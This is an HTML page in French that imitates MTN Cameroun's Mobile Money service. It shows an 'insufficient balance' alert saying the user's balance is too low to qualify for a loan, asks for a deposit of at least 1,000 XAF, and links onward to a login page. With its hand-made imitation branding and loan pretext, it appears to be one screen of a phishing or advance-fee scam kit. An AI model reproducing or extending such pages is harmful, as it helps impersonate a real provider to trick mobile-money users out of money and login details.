<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>MTN  – Solde insuffisant</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: #ffffff;
      --card: #ffffff;
      --border: #e5e7eb;
      --text: #111827;
      --sub: #6b7280;
      --mtn-yellow: #FFCC00;
      --mtn-darkyellow: #E6B800;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      --radius: 18px;
    }

    body {
      font-family: 'Inter', Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
      padding: 20px 12px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 28px;
      padding: 24px 20px 30px;
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
    }

    .mtn-header {
      position: relative;
      z-index: 2;
      text-align: center;
      margin-bottom: 16px;
    }

    .logo-circle {
      width: 56px;
      height: 56px;
      background: #000;
      border-radius: 50%;
      color: var(--mtn-yellow);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      font-weight: 800;
      margin: 0 auto 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    }

    .logo-text {
      color: #000;
      font-size: 28px;
      font-weight: 800;
      letter-spacing: -0.5px;
      line-height: 1;
      margin-bottom: 4px;
    }

    .logo-text span {
      color: var(--mtn-yellow);
      background: #000;
      display: inline-block;
      padding: 0 6px;
      border-radius: 10px;
    }

    .alert-card {
      background: var(--card);
      border-radius: var(--radius);
      padding: 28px 20px;
      box-shadow: var(--shadow);
      border: 1px solid var(--border);
      text-align: center;
      margin: 20px 0 24px;
      position: relative;
      z-index: 2;
    }

    .alert-title {
      font-size: 28px;
      font-weight: 800;
      color: var(--mtn-yellow);
      margin-bottom: 20px;
      letter-spacing: -0.3px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .alert-title i {
      font-size: 32px;
      color: #FFCC00;
    }

    .amount {
      font-size: 42px;
      font-weight: 800;
      color: #000;
      margin-bottom: 12px;
      line-height: 1.2;
    }

    .message-text {
      font-size: 16px;
      color: var(--sub);
      line-height: 1.6;
      margin-bottom: 28px;
      max-width: 300px;
      margin-left: auto;
      margin-right: auto;
    }

    .message-text strong {
      color: var(--text);
      font-weight: 700;
    }

    .btn {
      width: 100%;
      padding: 16px 20px;
      border: none;
      border-radius: 40px;
      background: linear-gradient(90deg, var(--mtn-yellow), var(--mtn-darkyellow));
      color: #000;
      font-size: 16px;
      font-weight: 800;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(255, 204, 0, 0.3);
      transition: 0.2s;
      text-decoration: none;
      display: inline-block;
    }

    .btn:hover {
      background: linear-gradient(90deg, #E6B800, #D4A600);
      transform: scale(1.02);
    }

    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 12px;
      color: #aaa;
      position: relative;
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="mtn-header">
      <div class="logo-circle">M</div>
      <div class="logo-text"><span>MTN</span> </div>
    </div>

    <div class="alert-card">
      <div class="alert-title">
        <i class="fas fa-exclamation-triangle"></i> Alerte de solde insuffisant
      </div>

      <div class="amount">Minimum 1 000 XAF</div>

      <div class="message-text">
        Votre solde MTN MoMo est trop bas pour pouvoir bénéficier d'un prêt.<br><br>
        Veuillez déposer au moins <strong>1 000 XAF</strong> sur votre portefeuille MTN Mobile Money, puis réessayer.
      </div>

      <a href="login.html" class="btn">Réessayer après dépôt</a>
    </div>

    <div class="footer">
      v2.6.2 (MTN-QWIK-2026) • MTN  Cameroun
    </div>
  </div>
</body>
</html>
